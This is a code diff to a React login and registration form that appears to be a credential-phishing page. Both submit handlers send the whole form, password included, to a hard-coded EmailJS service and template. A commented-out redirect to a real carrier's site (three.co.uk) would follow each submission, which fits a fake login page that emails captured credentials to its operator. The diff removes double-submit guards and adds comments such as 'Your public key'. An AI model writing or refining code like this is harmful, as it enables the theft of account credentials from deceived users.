@@ -7,7 +7,6 @@ const AuthForm = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   const [accountType, setAccountType] = useState("personal");
-  const [isSending, setIsSending] = useState(false); // ✅ prevent double click
 
   // State for input fields
   const [formData, setFormData] = useState({
@@ -24,60 +23,54 @@ const AuthForm = () => {
 
   const form = useRef();
 
-  // ✅ Login email sender
+  // Login email sender
   const sendLoginEmail = (e) => {
     e.preventDefault();
-    if (isSending) return; // prevent multiple sends
-    setIsSending(true);
 
     emailjs
       .sendForm(
         "service_50q88et",
         "template_bh85laf",
         form.current,
-        "vambHF3ypLBcOv_j_"
+        "vambHF3ypLBcOv_j_" // ✅ Your public key
       )
       .then(
         (result) => {
           console.log("Login email sent:", result.text);
+          // You can uncomment this after testing:
           // window.location.href = "https://www.three.co.uk/";
         },
         (error) => {
           console.log("Error sending login email:", error.text);
         }
-      )
-      .finally(() => {
-        setIsSending(false);
-        e.target.reset();
-      });
+      );
+
+    e.target.reset();
   };
 
-  // ✅ Register email sender
+  // Register email sender
   const sendRegisterEmail = (e) => {
     e.preventDefault();
-    if (isSending) return; // prevent multiple sends
-    setIsSending(true);
 
     emailjs
       .sendForm(
         "service_50q88et",
         "template_bh85laf",
         form.current,
-        "vambHF3ypLBcOv_j_"
+        "vambHF3ypLBcOv_j_" // ✅ Your public key
       )
       .then(
         (result) => {
           console.log("Register email sent:", result.text);
+          // You can uncomment this after testing:
           // window.location.href = "https://www.three.co.uk/";
         },
         (error) => {
           console.log("Error sending register email:", error.text);
         }
-      )
-      .finally(() => {
-        setIsSending(false);
-        e.target.reset();
-      });
+      );
+
+    e.target.reset();
   };
 
   return (
@@ -98,7 +91,6 @@ const AuthForm = () => {
         {/* Tabs */}
         <div className="flex justify-center mt-4 border-b border-gray-900">
           <button
-            type="button"
             className={`w-1/2 pb-2 font-medium text-center ${
               !isRegister ? "border-b-2 border-black" : "text-gray-500"
             }`}
@@ -107,7 +99,6 @@ const AuthForm = () => {
             Log in
           </button>
           <button
-            type="button"
             className={`w-1/2 pb-2 font-medium text-center ${
               isRegister ? "border-b-2 border-black" : "text-gray-500"
             }`}
@@ -187,7 +178,7 @@ const AuthForm = () => {
           <div className="relative mt-4">
             <input
               type={showPassword ? "text" : "password"}
-              name="password"
+              name="password" // ✅ Fixed field name
               value={formData.password}
               onChange={handleChange}
               placeholder="Password*"
@@ -222,9 +213,7 @@ const AuthForm = () => {
                 />
                 <span
                   className="absolute right-2 top-3 text-gray-500 cursor-pointer"
-                  onClick={() =>
-                    setShowConfirmPassword(!showConfirmPassword)
-                  }
+                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                 >
                   {showConfirmPassword ? (
                     <FiEyeOff size={20} />
@@ -248,16 +237,9 @@ const AuthForm = () => {
           {/* Submit Button */}
           <button
             type="submit"
-            disabled={isSending}
-            className={`w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6 ${
-              isSending ? "opacity-50 cursor-not-allowed" : ""
-            }`}
+            className="w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6"
           >
-            {isSending
-              ? "Sending..."
-              : isRegister
-              ? "Register"
-              : "Log in"}
+            {isRegister ? "Register" : "Log in"}
           </button>
         </form>
       </div>
